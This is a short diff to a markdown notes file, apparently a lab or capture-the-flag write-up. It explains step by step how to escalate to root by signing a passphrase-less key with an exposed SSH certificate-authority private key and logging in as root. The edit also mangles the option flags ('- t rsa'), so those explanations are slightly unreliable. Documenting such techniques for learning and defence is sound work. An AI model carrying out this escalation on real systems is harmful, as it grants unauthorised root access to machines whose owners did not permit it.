@@ -125,20 +125,20 @@ int main()
 
 
 ## Public ssh keys
-ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa -N ""
+- ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa -N ""
 Explanation:
-    -t rsa → generate RSA key
-    -b 4096 → strong key size
-    -f /tmp/id_rsa → save private key at /tmp/id_rsa
-    -N "" → no passphrase (so we can use it non-interactively)
+    - t rsa → generate RSA key
+    - b 4096 → strong key size
+    - f /tmp/id_rsa → save private key at /tmp/id_rsa
+    - N "" → no passphrase (so we can use it non-interactively)
  
 ssh-keygen -s /opt/principal/ssh/ca -I "Exploit" -n root -V +1h /tmp/id_rsa.pub
 Explanation:
-    -s /opt/principal/ssh/ca → use the CA private key to sign
-    -I "Exploit" → certificate identity (just a label)
-    -n root → this defines which user we are allowed to authenticate as
-    -V +1h → certificate validity (valid for 1 hour)
-    /tmp/id_rsa.pub → the public key we are signing
+    - s /opt/principal/ssh/ca → use the CA private key to sign
+    - I "Exploit" → certificate identity (just a label)
+    - n root → this defines which user we are allowed to authenticate as
+    - V +1h → certificate validity (valid for 1 hour)
+    - /tmp/id_rsa.pub → the public key we are signing
     
 ssh -i /tmp/id_rsa root@localhost
 
